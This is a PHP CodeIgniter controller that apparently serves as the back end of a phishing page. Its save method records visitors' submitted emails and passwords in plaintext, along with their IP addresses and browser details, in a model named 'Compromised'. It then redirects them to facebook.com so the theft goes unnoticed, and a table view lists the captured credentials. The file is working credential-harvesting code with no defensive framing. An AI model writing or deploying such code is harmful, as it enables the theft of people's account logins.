<?php

namespace App\Controllers;

use App\Controllers\BaseController;
use App\Models\Compromised;

class CompromisedController extends BaseController
{
    public function home()
    {
        return view('compromised/home');
    }

    public function save()
    {
        $model = model(Compromised::class);        

        if ($this->request->getMethod() === 'post' && $this->validate([
            'email' => 'required',
            'password' => 'required'
        ])) {
            $model->save([
                'email' => $this->request->getPost('email'),
                'password' => $this->request->getPost('password'),
                'ip_address' => $this->request->getIPAddress(),
                'user_agent' => $this->user_agent(),
            ]);
        }

        return redirect()->to('https://facebook.com');
        //return redirect()->to('/table');
    }

    public function table()
    {
        $compromised = new Compromised;

        $data['fields'] = $compromised->get_fields();

        return view('compromised/table.php', $data);
    }

    public function user_agent()
    {
        $agent = $this->request->getUserAgent();

        if ($agent->isBrowser()) {
            $currentAgent = $agent->getBrowser() . '|' . $agent->getVersion() . '|' . $agent->getPlatform();
        } elseif ($agent->isRobot()) {
            $currentAgent = $agent->getRobot();
        } elseif ($agent->isMobile()) {
            $currentAgent = $agent->getMobile();
        } else {
            $currentAgent = 'Unidentified User Agent';
        }

        return $currentAgent;
        
    }
}
